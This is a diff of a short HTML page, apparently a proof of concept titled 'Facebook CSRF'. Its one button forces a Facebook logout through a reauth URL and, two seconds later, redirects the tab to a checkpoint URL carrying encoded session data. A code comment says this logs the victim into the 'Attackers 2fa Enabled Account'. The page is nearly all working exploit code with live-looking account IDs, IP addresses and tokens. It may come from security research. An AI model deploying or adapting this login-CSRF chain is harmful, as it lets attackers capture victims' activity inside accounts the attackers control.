@@ -1,30 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Popup and Redirect</title>
+  <title>Facebook CSRF</title>
   <script>
     function handleClick() {
-      // Open popup
-      window.open(
-        'https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=61559852429573&force_logout=1',
-        'popupWindow',
-        'width=100,height=100,resizable=no,scrollbars=no'
-      );
+      
+      setTimeout(function() {
+        window.open('https://www.facebook.com/fxreauth/?app_id=1217981644879628&etoken=test&account_id=61559852429573&force_logout=1', '_blank');  //LOGOUT CSRF
+      }, 1000);// 1 seconds
 
-      // Call delayed redirect function
-      delayedRedirect();
-    }
-
-    function delayedRedirect() {
-      setTimeout(function () {
-        window.location.replace('https://www.facebook.com/checkpoint/start/?ip=157.51.113.149&cookie=%7B%22u%22%3A61576813658350%2C%22t%22%3A1752836928%2C%22step%22%3A0%2C%22n%22%3A%22L4evMPq7Zdg%3D%22%2C%22inst%22%3A122102075528893788%2C%22f%22%3A193593390684083%2C%22st%22%3A%22p%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221752836930.ch.s%3Apw.tDBGAiEApxmVWzE8Ra8hv8guC-gfuaBCIIhNICr6sZq36_hTZGoCIQCm4UcFbfa3LfBcpt6dXQqwUcG1acG-9DZtuwxjhAioHw%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3Anull%2C%22s%22%3A%22AWXQ7jMB5MQV_NY_V3o%22%2C%22cs%22%3A%5B%5D%2C%22mdcr%22%3A%22A2u2n3oJuRmF5NS9fuOhVDa%22%2C%22dc%22%3A%22Lit6aDN2VdHaC5e9uv3I1lOw%22%7D&next=https%3A%2F%2Fwww.messenger.com%2F&hash=AWWzJzhoKkuX50UENkQ');
-      }, 2000); // Wait 2 seconds
+      // Wait for 2 seconds, then replace  current tab
+      setTimeout(function() {
+        window.location.replace('https://www.facebook.com/checkpoint/start/?ip=157.51.113.66&cookie=%7B%22u%22%3A61576813658350%2C%22t%22%3A1752846145%2C%22step%22%3A0%2C%22n%22%3A%22hDIALytB1TE%3D%22%2C%22inst%22%3A122102075528893788%2C%22f%22%3A193593390684083%2C%22st%22%3A%22p%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221752846147.ch.s%3Apw.tDBFAiEAkv3wKCzse2xWXQXY-jMegX-lEPyZTLB48he6q4hX_1oCIAwoAIs1aJpzYgb4B-XqxchAcC_H2S22lK0yXx0YQuGT%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3Anull%2C%22s%22%3A%22AWWHFDmfWAVD-1r3edk%22%2C%22cs%22%3A%5B%5D%2C%22mdcr%22%3A%22AZr-GT3v8Qdvgyo8CzAdOo-%22%2C%22dc%22%3A%22Nk96aAQ408Zi3UJrzo1iS8cH%22%7D&next=https%3A%2F%2Fwww.messenger.com%2F&hash=AWXu43DLAoUi8ubWlT4'); //LOGIN Attackers 2fa Enabled Account
+      }, 2000);// 2 seconds
     }
   </script>
 </head>
 <body>
 
-  <button onclick="handleClick()">Start Process</button>
+  <button onclick="handleClick()">REPLACE FB DATR</button>
 
 </body>
 </html>
